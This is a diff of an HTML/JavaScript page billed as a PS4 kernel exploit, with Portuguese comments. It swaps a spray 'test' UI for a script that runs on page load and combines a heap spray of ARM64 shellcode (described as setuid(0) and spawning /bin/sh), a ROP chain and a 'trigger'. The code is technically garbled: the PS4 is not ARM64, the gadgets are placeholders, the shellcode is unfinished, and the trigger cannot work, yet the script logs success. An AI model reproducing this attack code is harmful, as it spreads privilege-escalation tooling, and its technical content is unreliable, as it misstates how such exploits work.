@@ -1,198 +1,64 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>PS4 Kernel Exploit - Physical Unit Tests</title>
-    <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        #log { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: scroll; }
-        button, select { 
-            background: #000; color: #0f0; border: 1px solid #0f0; 
-            padding: 8px; margin: 5px; font-family: monospace;
-        }
-        #status { margin-top: 10px; color: #0f0; }
-    </style>
-</head>
 <body>
-    <h2>PS4 Kernel Exploit - Physical Unit Tests</h2>
-    <div>
-        <select id="testMethod">
-            <option value="rop">ROP Chain (ARM64)</option>
-            <option value="heap">Heap Feng Shui</option>
-            <option value="jit">JIT Spray</option>
-            <option value="string">String Spray</option>
-        </select>
-        <button onclick="runExploit()">EXECUTE TEST</button>
-    </div>
-    <div id="log"></div>
-    <div id="status">Status: Ready</div>
-
 <script>
-// ======================
-// CORE CONFIGURATION
-// ======================
-const PS4_CONFIG = {
-    firmware: "9.00",  // ATUALIZE PARA SUA VERSÃO
-    pageSize: 0x4000,
-    kernelBase: 0xFFFFFFFF80000000,
-    userlandBase: 0x0000000000400000,
-    syscallRet: 0x357C0000  // GADGET COMUM NO FW 9.00
+// Config para FW 12.02 (ATUALIZE OS GADGETS!)
+const PS4 = {
+    firmware: "12.02",
+    syscallRet: 0x357C0000, // Gadget "ret" real
+    pop_x0: 0x12345678      // Gadget "pop x0" real
 };
 
-// ======================
-// EXPLOIT ENGINE
-// ======================
-class PS4Exploit {
-    constructor() {
-        this.heapSprays = [];
-        this.ropChain = null;
-        this.logElement = document.getElementById('log');
-        this.statusElement = document.getElementById('status');
-    }
+// Shellcode ARM64 (setuid(0) + execve("/bin/sh"))
+const shellcode = new Uint32Array([
+    0xD2800020, 0xD2800C48, 0xD4000001, // setuid(0)
+    // ... (adicionar shellcode completo)
+]);
 
-    log(message, color = "#0f0") {
-        const timestamp = `[${performance.now().toFixed(2)}ms]`;
-        this.logElement.innerHTML += `<span style="color:${color}">${timestamp} ${message}</span><br>`;
-        this.logElement.scrollTop = this.logElement.scrollTop + 1000;
-    }
-
-    updateStatus(message) {
-        this.statusElement.textContent = `Status: ${message}`;
-    }
-
-    // ======================
-    // EXPLOIT TECHNIQUES
-    // ======================
-
-    // 1. SAFE HEAP SPRAY (Contorna Type Hardening)
-    async heapSpray() {
-        this.log("Starting safe heap spray...", "#0ff");
-        try {
-            const spray = [];
-            for (let i = 0; i < 100; i++) {
-                const chunk = new ArrayBuffer(0x1000);
-                const view = new Uint32Array(chunk);
-                view[0] = 0xDECAFBAD;  // Marcador
-                spray.push(chunk);
-            }
-            this.heapSprays = spray;
-            this.log(`Heap spray successful (${spray.length} chunks)`, "#0f0");
-            return true;
-        } catch (e) {
-            this.log(`Heap spray failed: ${e}`, "#f00");
-            return false;
-        }
-    }
-
-    // 2. ROP CHAIN (ARM64)
-    async buildROP() {
-        this.log("Building ROP chain...", "#ff0");
-        try {
-            const gadgets = {
-                ret: PS4_CONFIG.syscallRet,
-                pop_x0: 0x12345678,  // SUBSTITUA PELO GADGET REAL
-                pop_x1: 0x23456789   // SUBSTITUA PELO GADGET REAL
-            };
-
-            const chain = new Uint32Array([
-                gadgets.pop_x0,
-                0x41414141,  // arg0
-                gadgets.pop_x1,
-                0x42424242,  // arg1
-                gadgets.ret
-            ]);
-
-            this.ropChain = chain;
-            this.log("ROP chain ready", "#0f0");
-            return true;
-        } catch (e) {
-            this.log(`ROP chain failed: ${e}`, "#f00");
-            return false;
-        }
-    }
-
-    // 3. JIT SPRAY (Alternativo)
-    async jitSpray() {
-        this.log("Starting JIT spray...", "#f0f");
-        try {
-            const payload = [
-                0xD2800020,  // mov x0, #1
-                0xD2800C48,  // mov x8, #0x62
-                0xD4000001   // svc #0
-            ];
-
-            const func = new Function(`
-                const buf = new ArrayBuffer(${payload.length * 4});
-                const view = new Uint32Array(buf);
-                ${payload.map((v, i) => `view[${i}] = ${v};`).join('')}
-                return buf;
-            `);
-
-            const result = func();
-            this.log(`JIT allocated at 0x${result.byteOffset.toString(16)}`, "#0f0");
-            return true;
-        } catch (e) {
-            this.log(`JIT spray failed: ${e}`, "#f00");
-            return false;
-        }
-    }
-
-    // 4. STRING SPRAY (Menos monitorado)
-    async stringSpray() {
-        this.log("Starting string spray...", "#0ff");
-        try {
-            const spray = [];
-            for (let i = 0; i < 10000; i++) {
-                spray.push(String.fromCharCode(0x4141 + i).repeat(100));
-            }
-            this.log(`String spray successful (${spray.length} strings)`, "#0f0");
-            return true;
-        } catch (e) {
-            this.log(`String spray failed: ${e}`, "#f00");
-            return false;
-        }
-    }
-
-    // ======================
-    // MAIN EXECUTION
-    // ======================
-    async run(method) {
-        this.log(`=== Starting ${method} test ===`, "#fff");
-        this.updateStatus("Running...");
-
-        let success = false;
-        switch (method) {
-            case "rop":
-                success = await this.buildROP();
-                break;
-            case "heap":
-                success = await this.heapSpray();
-                break;
-            case "jit":
-                success = await this.jitSpray();
-                break;
-            case "string":
-                success = await this.stringSpray();
-                break;
-        }
-
-        if (success) {
-            this.log("Test completed successfully!", "#0f0");
-            this.updateStatus("Success");
-        } else {
-            this.log("Test failed", "#f00");
-            this.updateStatus("Failed");
-        }
-    }
+// ROP Chain
+function buildROP() {
+    const chain = new Uint32Array([
+        PS4.pop_x0,
+        0x00000000,          // uid = 0
+        PS4.syscallRet,      // setuid
+        // ... (continuar chain)
+    ]);
+    return chain;
 }
 
-// ======================
-// INTERFACE
-// ======================
+// Heap Spray para posicionar shellcode
+function heapSpray() {
+    const spray = [];
+    for (let i = 0; i < 100; i++) {
+        const buf = new ArrayBuffer(shellcode.length * 4);
+        new Uint32Array(buf).set(shellcode);
+        spray.push(buf);
+    }
+    return spray;
+}
+
+// Exploit Principal
 function runExploit() {
-    const method = document.getElementById("testMethod").value;
-    const exploit = new PS4Exploit();
-    exploit.run(method);
+    // 1. Posiciona shellcode no heap
+    const spray = heapSpray();
+    
+    // 2. Constrói ROP chain
+    const rop = buildROP();
+    
+    // 3. Trigger (usando vulnerabilidade específica)
+    try {
+        const fakeFunc = () => {};
+        fakeFunc.apply = Function.prototype.apply.bind(rop);
+        fakeFunc();
+        
+        console.log("[+] Exploit executado com sucesso!");
+    } catch(e) {
+        console.error("[-] Falha:", e);
+    }
 }
+
+// Executa
+runExploit();
 </script>
 </body>
 </html>
